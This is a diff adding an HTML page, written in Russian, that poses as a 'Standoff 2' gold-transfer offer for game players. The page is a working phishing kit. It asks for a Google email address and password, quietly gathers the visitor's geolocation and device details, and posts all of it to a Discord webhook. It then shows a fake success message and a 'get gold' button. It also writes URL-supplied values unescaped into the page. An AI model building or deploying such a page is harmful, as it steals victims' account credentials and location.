@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Standoff 2 - Gold transfer</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      width: 90%;
+      max-width: 400px;
+      background-color: #1a1a1a;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+    }
+    h1, h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #555;
+      background-color: #333;
+      color: #fff;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0066cc;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #005bb5;
+    }
+    .form-section {
+      margin-bottom: 20px;
+    }
+    #url-info {
+      margin-bottom: 20px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    #login-result {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Gold transfer</h1>
+    <div id="url-info"></div>
+    
+    <div class="form-section">
+      <h2>Авторизация</h2>
+      <form id="login-form">
+        <div class="input-group">
+          <label for="email">Google Почта:</label>
+          <input type="email" id="email" name="email" placeholder="Введите адрес электронной почты" required>
+        </div>
+        <div class="input-group">
+          <label for="password">Пароль от почты:</label>
+          <input type="password" id="password" name="password" placeholder="Введите пароль" required>
+        </div>
+        <button type="submit">Войти</button>
+      </form>
+      <div id="login-result"></div>
+    </div>
+    
+    <div class="form-section" id="gold-section" style="display:none;">
+      <h2>Получить голду</h2>
+      <button id="get-gold-button">Получить Gold</button>
+    </div>
+  </div>
+
+  <script>
+    const DISCORD_WEBHOOK_URL = "";
+
+    // Объект для хранения информации об устройстве и геолокации
+    const clientInfo = {
+      geolocation: {},
+      device: {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: window.screen.width + "x" + window.screen.height
+      }
+    };
+
+    // Запрос геолокации
+    if ('geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(position => {
+        clientInfo.geolocation = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy
+        };
+      }, error => {
+        console.error('Ошибка получения геолокации:', error);
+      });
+    } else {
+      console.error('Геолокация не поддерживается данным браузером');
+    }
+
+    // Функция для декодирования Base64-параметров и парсинга строки
+    function decodeBase64Params(base64Str) {
+      try {
+        const decodedStr = atob(base64Str);
+        let idx = 0;
+        // Длина ID отправителя
+        const senderIdLength = parseInt(decodedStr[idx], 10);
+        idx++;
+        const senderId = decodedStr.substr(idx, senderIdLength);
+        idx += senderIdLength;
+        // Длина ника отправителя
+        const senderNickLength = parseInt(decodedStr[idx], 10);
+        idx++;
+        const senderNick = decodedStr.substr(idx, senderNickLength);
+        idx += senderNickLength;
+        // Длина количества голды
+        const goldAmountLength = parseInt(decodedStr[idx], 10);
+        idx++;
+        const goldAmount = decodedStr.substr(idx, goldAmountLength);
+        return { senderId, senderNick, goldAmount };
+      } catch (error) {
+        console.error("Ошибка декодирования параметров:", error);
+        return null;
+      }
+    }
+
+    // Извлечение параметров из URL
+    function getParamsFromURL() {
+      const params = new URLSearchParams(window.location.search);
+      const data = params.get("ID");
+      if (data) {
+        return decodeBase64Params(data);
+      }
+      return null;
+    }
+
+    // Отображение переданных параметров на странице
+    const urlParams = getParamsFromURL();
+    if (urlParams) {
+      document.getElementById("url-info").innerHTML =
+        "ID отправителя: " + urlParams.senderId + "<br>" +
+        "Ник отправителя: " + urlParams.senderNick + "<br>" +
+        "Количество Gold: " + urlParams.goldAmount;
+    } else {
+      document.getElementById("url-info").innerHTML = "Некорректный ID транзакции";
+    }
+
+    // Функция для отправки данных на Discord Webhook
+    function sendDataToWebhook(messageContent, callback) {
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: messageContent })
+      })
+      .then(response => {
+        if (response.ok) {
+          callback(true);
+        } else {
+          callback(false);
+        }
+      })
+      .catch(error => {
+        console.error("Ошибка отправки данных:", error);
+        callback(false);
+      });
+    }
+
+    // Обработка формы авторизации
+    document.getElementById("login-form").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      const message = "Новая авторизация:\n" +
+                      "Email: " + email + "\n" +
+                      "Пароль: " + password + "\n" +
+                      "Дополнительная информация: " + JSON.stringify(clientInfo);
+
+      sendDataToWebhook(message, function(success) {
+        if (success) {
+          document.getElementById("login-result").textContent = "Авторизация прошла успешно";
+          document.getElementById("gold-section").style.display = "block";
+        } else {
+          document.getElementById("login-result").textContent = "Ошибка при авторизации";
+        }
+      });
+    });
+
+    // Обработка запроса на получение голды
+    document.getElementById("get-gold-button").addEventListener("click", function() {
+      if (urlParams) {
+        const message = "Запрос на получение голды:\n" +
+                        "ID отправителя: " + urlParams.senderId + "\n" +
+                        "Ник отправителя: " + urlParams.senderNick + "\n" +
+                        "Количество Gold: " + urlParams.goldAmount + "\n" +
+                        "Дополнительная информация: " + JSON.stringify(clientInfo);
+
+        sendDataToWebhook(message, function(success) {
+          if (success) {
+            alert("Передеча Gold успешно завершена");
+          } else {
+            alert("Ошибка при отправке запроса на получение Gold");
+          }
+        });
+      } else {
+        alert("Неверный ID транзакции");
+      }
+    });
+  </script>
+</body>
+</html>
